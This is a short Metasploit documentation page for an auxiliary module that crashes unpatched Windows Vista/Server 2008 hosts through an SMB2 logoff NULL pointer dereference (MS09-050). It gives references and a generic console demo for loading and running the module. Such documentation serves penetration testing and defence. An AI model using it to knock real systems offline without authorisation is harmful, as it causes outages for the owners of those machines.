## Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer Dereference

This module triggers a NULL pointer dereference in the 
SRV2.SYS kernel driver when processing an SMB2 logoff 
request before a session has been correctly negotiated, 
resulting in a BSOD. Effecting Vista SP1/SP2 (And possibly 
Server 2008 SP1/SP2), the flaw was resolved with MS09-050.


## Module Name
auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff

## Authors
* sf


## References
* http://cvedetails.com/cve/2009-3103/
* http://www.osvdb.org/57799
* http://technet.microsoft.com/en-us/security/bulletin/MS09-050




## Platforms


## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff
msf auxiliary(ms09_050_smb2_session_logoff) > show targets
   ... a list of targets ...
msf auxiliary(ms09_050_smb2_session_logoff) > set TARGET <target-id>
msf auxiliary(ms09_050_smb2_session_logoff) > show options
   ... show and set options ...
msf auxiliary(ms09_050_smb2_session_logoff) > run
```
    
    